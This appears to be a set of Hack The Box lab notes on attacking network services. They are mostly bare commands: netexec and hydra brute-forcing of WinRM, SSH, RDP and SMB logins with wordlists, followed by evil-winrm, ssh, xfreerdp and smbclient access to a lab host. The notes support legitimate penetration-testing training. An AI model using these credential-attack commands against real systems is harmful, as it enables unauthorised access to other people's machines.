...
Network Services  
```
Pavlo142@htb[/htb]$ sudo apt-get -y install netexec
...
Network Services  
```
Pavlo142@htb[/htb]$ netexec smb -h
...
Network Services  
```
Pavlo142@htb[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
...
Network Services  
```
Pavlo142@htb[/htb]$ netexec winrm 10.129.42.197 -u user.list -p password.list
...
Network Services  
```
Pavlo142@htb[/htb]$ sudo gem install evil-winrm
...
Network Services  
```
Pavlo142@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
...
Network Services  
```
Pavlo142@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password
...
Network Services  
```
Pavlo142@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
...
Network Services  
```
Pavlo142@htb[/htb]$ ssh user@10.129.42.197
...
Network Services  
```
Pavlo142@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
...
Network Services  
```
Pavlo142@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password
...
```
![Recycle Be](Attachments/D3FF3DD6-B26A-4B61-B30B-DB8D9F09C154.png)  
## SMB  
...
Network Services  
```
Pavlo142@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
...
Network Services  
```
Pavlo142@htb[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares
...
SMB         10.129.42.197   445    WINSRV           IPC
```
```
$            READ            Remote IPC
...
Network Services  
```
Pavlo142@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME
